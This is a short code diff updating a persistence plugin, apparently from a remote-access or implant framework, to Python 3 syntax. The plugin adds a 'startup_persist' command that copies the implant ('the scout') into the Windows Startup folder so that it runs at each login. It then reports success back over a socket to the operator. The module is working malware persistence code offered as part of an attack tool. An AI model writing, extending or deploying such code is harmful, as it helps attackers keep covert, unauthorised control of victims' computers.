@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -13,15 +12,15 @@ def main(option):
         config.functions.append('''
 def startup_persist(filepath):
         copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
-        s.sendall('[+]Persistence via startup folder achieved')''')
+        s.sendall('[+]Persistence via startup folder achieved'.encode())''')
         config.logics.append('''
             elif command == "startup_persist":
                 startup_persist(path.join(getcwd(),path.abspath(argv[0])))''')
         config.help_menu[
             'startup_persist'] = 'This module copies the scout to the windows startup folder'
     elif option == 'info':
-        print '\nName             : Registry Persistence component' \
+        print('\nName             : Registry Persistence component' \
               '\nOS               : Windows' \
               '\nRequired Modules : shutil, sys, os' \
               '\nCommands         : reg_persist' \
-              '\nDescription      : This module copies the scout to the windows startup folder'
+              '\nDescription      : This module copies the scout to the windows startup folder')
